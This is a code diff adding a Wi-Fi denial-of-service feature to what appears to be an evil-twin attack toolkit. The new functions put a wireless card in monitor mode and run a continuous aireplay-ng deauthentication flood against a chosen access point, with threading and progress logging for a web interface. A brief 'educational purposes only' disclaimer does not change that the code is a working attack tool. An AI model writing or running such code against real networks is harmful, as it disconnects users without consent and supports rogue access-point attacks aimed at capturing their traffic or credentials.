@@ -219,6 +219,113 @@ def launch_evil_twin_attack(network, attack_config):
         add_log_message("Failed to create required configuration files")
         raise Exception("Failed to create required configuration files")
 
+#!/usr/bin/env python3
+# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
+def dos_attack(bssid, channel, interface):
+    """Launch a DoS attack using aireplay-ng
+    
+    Args:
+        bssid (str): Target BSSID
+        channel (str): Target channel
+        interface (str): Wireless interface to use
+    """
+    from web.shared import attack_state
+    
+    # Set monitor mode using the network_utils function
+    add_log_message(f"[DoS] Setting {interface} to monitor mode...")
+    set_monitor_mode(interface)
+    update_attack_progress(10)
+    
+    # Set channel
+    try:
+        add_log_message(f"[DoS] Setting channel to {channel}...")
+        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
+        add_log_message(f"[DoS] Channel set to {channel}")
+    except subprocess.CalledProcessError as e:
+        add_log_message(f"[DoS] Error setting channel: {e}")
+        set_managed_mode(interface)
+        raise
+    
+    update_attack_progress(20)
+    
+    # Start DoS attack in a separate thread
+    dos_thread = threading.Thread(
+        target=run_dos_attack,
+        args=(bssid, interface, attack_state['stop_event']),
+        daemon=True
+    )
+    
+    attack_state['threads'].append(dos_thread)
+    dos_thread.start()
+    add_log_message(f"[DoS] Attack started against {bssid}")
+    update_attack_progress(30)
+
+def run_dos_attack(bssid, interface, stop_event):
+    """Run the DoS attack until stopped using aireplay-ng
+    
+    Args:
+        bssid (str): Target BSSID
+        interface (str): Wireless interface to use
+        stop_event (threading.Event): Event to signal when to stop
+    """
+    add_log_message(f"[DoS] Launching aireplay-ng deauth attack on BSSID {bssid}")
+    
+    # Prepare aireplay-ng command
+    aireplay_cmd = [
+        'sudo', 'aireplay-ng',
+        '--deauth', '0',  # Continuous deauth
+        '-a', bssid,      # Target BSSID
+        interface          # Interface
+    ]
+    
+    try:
+        # Start aireplay-ng process
+        process = subprocess.Popen(
+            aireplay_cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            bufsize=1  # Line buffered
+        )
+        
+        add_log_message(f"[DoS] aireplay-ng started with PID {process.pid}")
+        update_attack_progress(50)
+        
+        # Monitor the process and check for stop signal
+        while process.poll() is None and not stop_event.is_set():
+            # Check for output from aireplay-ng
+            try:
+                # Use select to avoid blocking
+                import select
+                readable, _, _ = select.select([process.stdout, process.stderr], [], [], 0.5)
+                
+                for stream in readable:
+                    line = stream.readline()
+                    if line:
+                        add_log_message(f"[aireplay-ng] {line.strip()}")
+            except Exception as e:
+                add_log_message(f"[DoS] Error reading aireplay-ng output: {e}")
+            
+            # Check stop signal every 0.5 seconds
+            stop_event.wait(0.5)
+        
+        # If we get here, either the process ended or we were asked to stop
+        if process.poll() is None:  # Process is still running
+            add_log_message("[DoS] Stopping aireplay-ng...")
+            process.terminate()
+            try:
+                process.wait(timeout=5)  # Wait up to 5 seconds for graceful termination
+            except subprocess.TimeoutExpired:
+                add_log_message("[DoS] aireplay-ng did not terminate gracefully, killing.")
+                process.kill()
+    
+    except Exception as e:
+        add_log_message(f"[DoS] Error during aireplay-ng attack: {e}")
+    
+    # Attack has been stopped
+    add_log_message("[DoS] Attack stopped")
+    update_attack_progress(100)
+    
 def run_hostapd(config_file, stop_event):
     """
     Run hostapd with the specified configuration file.
